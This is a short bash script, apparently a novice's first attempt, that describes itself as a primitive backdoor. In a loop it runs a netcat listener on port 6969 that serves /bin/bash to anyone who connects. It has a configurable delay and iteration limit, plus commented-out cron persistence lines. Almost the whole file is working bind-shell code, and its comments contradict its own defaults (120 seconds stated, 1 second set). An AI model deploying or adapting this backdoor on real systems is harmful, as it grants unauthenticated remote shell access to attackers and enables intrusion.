#! /bin/bash

# This is my first real bash script, here I am commenting out so I know
# what I am going to do with this. The first script will add something to cron
# This is a very primative example of a backdoor on a program using netcat

echo "How many seconds should I wait to re-open the beacon?(120s default)"
read delay
echo "should I stop after a certian amount of iterations? (No limit default)"
read limit

#if there is no specified delay set to 1 second
if [ -z "$delay" ] ; then
 let delay=1
fi

#No Limit given
if [ -z "$limit" ] ; then
 # persistance?
 # $(crontab -l > /bin/newcron)
 # echo "*/1 * * * * /bin/zsh4" >> /bin/newcron
 # $(crontab /bin/newcron ; rm /bin/newcron)
 while true ; do
   $(nc -l -p 6969 -e /bin/bash)
   sleep $delay
 done

#Limit given
else
 # persistance?
 # $(crontab */1 * * * * /bin/zsh4)
 while [ "$limit" -gt 0 ] ; do
   $(nc -l -p 6969 -e /bin/bash)
   echo "Opened Shell"
   sleep $delay
   ((limit--))
 done
fi
